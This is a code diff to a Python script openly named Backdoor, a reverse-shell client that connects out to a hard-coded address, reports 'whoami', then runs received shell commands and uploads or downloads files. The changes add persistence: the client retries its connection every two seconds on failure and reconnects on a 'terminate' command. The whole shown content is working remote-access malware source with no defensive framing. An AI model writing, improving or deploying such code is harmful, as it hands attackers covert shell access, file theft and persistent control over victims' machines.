@@ -1,13 +1,21 @@
-import socket,subprocess,os
+import socket,subprocess,os,time
 
 class Backdoor:
 
     def __init__(self, IP, PORT):
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((IP,PORT))
-        self.r_send(self.exec_cmd("whoami"))
+        self.IP = IP
+        self.PORT = PORT
+        self.connect(self.IP, self.PORT)
         
-
+    def connect(self, IP, PORT):
+        try:
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.connection.connect((IP,PORT))
+            self.r_send(self.exec_cmd("whoami"))
+        except OSError:
+            time.sleep(2)
+            self.connect(self.IP, self.PORT)
+            
     def exec_cmd(self, cmd):
         res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout = res.stdout.read().decode().strip()
@@ -64,17 +72,20 @@ class Backdoor:
         while(True):
             cmd = self.r_recv()
             cmd = cmd.split(' ')
-            if cmd[0] == "cd":
+            if cmd[0] == "cd" and len(cmd)>1:
                 self.change_dir(cmd[1])
 
             if cmd[0] == "download":
                 self.upload(cmd[1])
             if cmd[0] == "upload":
                 self.download(cmd[1])
+            if cmd[0] == "terminate":
+                self.connect(self.IP, self.PORT)
 
             elif len(cmd)>0:
                 result = self.exec_cmd(cmd)
                 self.r_send(result)
+
 
 
 backdoor = Backdoor("192.168.1.99",2000)
